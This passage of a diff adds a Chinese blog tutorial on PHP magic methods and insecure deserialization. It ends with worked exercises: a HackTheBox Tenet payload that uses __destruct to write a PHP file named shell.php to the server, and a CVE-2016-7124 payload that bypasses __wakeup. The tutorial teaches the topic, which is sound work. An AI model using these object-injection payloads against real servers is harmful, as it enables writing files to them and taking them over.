+<span class="nv">$ser</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__construct</span> <span class="nx">test</span>
+</code></pre></div><p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
+<h3 id="__destruct">__destruct()</h3>
+<p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;__destruct test&lt;/br&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$ser</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__destruct</span> <span class="nx">test</span>
+<span class="nx">__destruct</span> <span class="nx">test</span>
+</code></pre></div><p>可以看到执行了两次**__destruct**，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
+<h3 id="__call">__call</h3>
+<p>在对象中调用一个不可访问方法时，<strong>__call()</strong> 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span><span class="nv">$arg2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2[0]</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$test</span><span class="o">-&gt;</span><span class="na">callxxx</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">callxxx</span><span class="p">,</span><span class="nx">a</span>
+</code></pre></div><p>可以看到__call需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
+<h3 id="__callstatic">__callStatic</h3>
+<p>在静态上下文中调用一个不可访问方法时，<strong>__callStatic()</strong> 会被调用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="fm">__callStatic</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span><span class="nv">$arg2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2[0]</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$test</span><span class="o">::</span><span class="na">callxxx</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">callxxx</span><span class="p">,</span><span class="nx">a</span>
+</code></pre></div><p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call**不同的是需要添加**static**，只有访问不存在的静态方法才会触发。</p>
+<h3 id="__get">__get</h3>
+<p>读取不可访问属性的值时，__get() 会被调用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$var1</span><span class="p">;</span>
+    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$arg1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$test</span><span class="o">-&gt;</span><span class="na">var2</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">var2</span>
+</code></pre></div><p><strong>__get</strong>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
+<h3 id="__set">__set</h3>
+<p>给不可访问属性赋值时，<strong>__set()</strong> 会被调用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$var1</span><span class="p">;</span>
+    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span><span class="nv">$arg2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$arg1</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="nv">$arg2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$test</span><span class="o">-&gt;</span><span class="na">var2</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">var2</span><span class="p">,</span><span class="mi">1</span>
+</code></pre></div><p>__set跟__get相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
+<h3 id="__isset">__isset</h3>
+<p>对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$var</span><span class="p">;</span>
+    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__isset</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$arg1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nx">isset</span><span class="p">(</span><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">var1</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">var1</span>
+</code></pre></div><p>该魔术方法使用了isset()或者empty()只要属性是private或者不存在的都会触发。</p>
+<h3 id="__unset">__unset</h3>
+<p>对不可访问属性调用 unset() 时，__unset() 会被调用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__unset</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$arg1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nx">unset</span><span class="p">(</span><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">var1</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">var1</span>
+</code></pre></div><p>如果一个类定义了魔术方法 __unset() ，那么我们就可以使用 unset() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
+<h3 id="__sleep">__sleep</h3>
+<p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 <strong>__sleep()</strong>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">const</span> <span class="no">SITE</span> <span class="o">=</span> <span class="s1">&#39;uusama&#39;</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$nickname</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="nv">$nickname</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 重载序列化调用的方法
+</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">// 返回需要序列化的变量名，过滤掉password变量
+</span><span class="c1"></span>        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;nickname&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;User&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;username&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;a&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;nickname&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;b&#34;</span><span class="p">;}</span>
+</code></pre></div><p>可以看到执行序列化之前会先执行__sleep()函数，上面__sleep的函数作用是过滤掉password的变量值。</p>
+<h3 id="__wakeup">__wakeup</h3>
+<p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用?<code>__wakeup()</code>?方法，预先准备对象需要的资源。</p>
+<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+    <span class="k">const</span> <span class="no">SITE</span> <span class="o">=</span> <span class="s1">&#39;uusama&#39;</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$nickname</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="nv">$nickname</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 定义反序列化后调用的方法
+</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$user_ser</span> <span class="o">=</span> <span class="s1">&#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:1:&#34;a&#34;;s:8:&#34;nickname&#34;;s:1:&#34;b&#34;;}&#39;</span><span class="p">;</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$user_ser</span><span class="p">));</span>
+</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">User</span><span class="c1">#1 (4) {
+</span><span class="c1"></span>  <span class="k">public</span> <span class="nv">$username</span> <span class="o">=&gt;</span>
+  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;a&#34;</span>
+  <span class="k">public</span> <span class="nv">$nickname</span> <span class="o">=&gt;</span>
+  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;b&#34;</span>
+  <span class="k">private</span> <span class="nv">$password</span> <span class="o">=&gt;</span>
+  <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;a&#34;</span>
+  <span class="k">private</span> <span class="nv">$order</span> <span class="o">=&gt;</span>
+  <span class="k">NULL</span>
+<span class="p">}</span>
+</code></pre></div><p>可以看到执行反序列化之前会先执行__wakeup()函数，上面__wakeup的函数作用是将username的变量值赋值给password变量。</p>
+<h3 id="__tostring">__toString</h3>
+<p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+    <span class="p">{</span>
+       <span class="k">return</span> <span class="s1">&#39;__toString test&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nv">$test</span><span class="p">;</span>
+</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__toString</span>
+</code></pre></div><p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
+<blockquote>
+<p>(1)echo ($obj) / print($obj) 打印时会触发
+(2)反序列化对象与字符串连接时
+(3)反序列化对象参与格式化字符串时
+(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
+(5)反序列化对象参与格式化SQL语句，绑定参数时
+(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
+(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用
+(8)反序列化的对象作为 class_exists() 的参数的时候</p>
+</blockquote>
+<h3 id="__invoke">__invoke</h3>
+<p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+    <span class="p">{</span>
+       <span class="k">echo</span> <span class="s1">&#39;__invoke test&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$test</span><span class="p">();</span>
+</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__invoke</span> <span class="nx">test</span>
+</code></pre></div><h3 id="__clone">__clone</h3>
+<p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__clone</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;__clone test&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="nv">$newclass</span> <span class="o">=</span> <span class="k">clone</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__clone</span> <span class="nx">test</span>
+</code></pre></div><h2 id="练习">练习</h2>
+<h3 id="hackthebox-tenet">Hackthebox-Tenet</h3>
+<p>htb上面有一道题是反序列化漏洞的题目：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+	<span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
+	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+	<span class="k">public</span> <span class="k">function</span> <span class="nf">update_db</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="k">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="nx">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="na">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+		<span class="k">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
+	<span class="c1">//	echo &#39;Gotta get this working properly...&#39;;
+</span><span class="c1"></span>	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;arepo&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>这题比较简单哈，上面我们已经讲过了<strong>serialize</strong>只对属性进行序列化操作，所以我们只要对属性进行修改就行了：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;shell.php&#39;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$app</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><h3 id="反序列化对象注入-cve-2016-7124">反序列化对象注入-CVE-2016-7124</h3>
+<ul>
+<li>漏洞影响版本：</li>
+</ul>
+<p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+<ul>
+<li>漏洞产生原因：</li>
+</ul>
+<p>如果存在wakeup方法，调用 unserilize() 方法前则先调用wakeup方法，但是序列化字符串中表示<code>对象属性个数</code>的值<code>大于</code>?<code>真实的属性个数</code>时会跳过__wakeup的执行</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">)){</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="s1">&#39;flag&#39;</span><span class="p">)</span>
+                <span class="k">echo</span> <span class="s1">&#39;success&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="s1">&#39;you failed 23333&#39;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;answer&#39;</span><span class="p">])){</span>
+    <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nv">$answer</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;answer&#39;</span><span class="p">];</span>
+    <span class="k">echo</span> <span class="nv">$answer</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$answer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>按道理我们只要让key=flag就行了，payload=O:4:&ldquo;Test&rdquo;:1:{s:3:&ldquo;key&rdquo;;s:4:&ldquo;flag&rdquo;;}</p>
+<p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Test&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;key&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;flag&#34;</span><span class="p">;}</span>
+<span class="nx">you</span> <span class="nx">failed</span> <span class="mi">23333</span>
+</code></pre></div><p>这里发现已经被__wakeup抢先执行了改变了key的值，让__destruct里面的判断就不成立了。</p>
+<p>用我们刚才说的漏洞成因<code>对象属性个数</code>的值<code>大于</code>?<code>真实的属性个数</code>时会跳过__wakeup的执行。</p>
+<p>那我们只要改变一下属性的个数就行了：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Test&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;key&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;flag&#34;</span><span class="p">;}</span>
+</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Test&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;key&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;flag&#34;</span><span class="p">;}</span>
+<span class="nx">success</span>
+</code></pre></div>
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/">
+            Gitlab Cookie 反序列化漏洞研究
+        </a>
+    </li>
+    
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
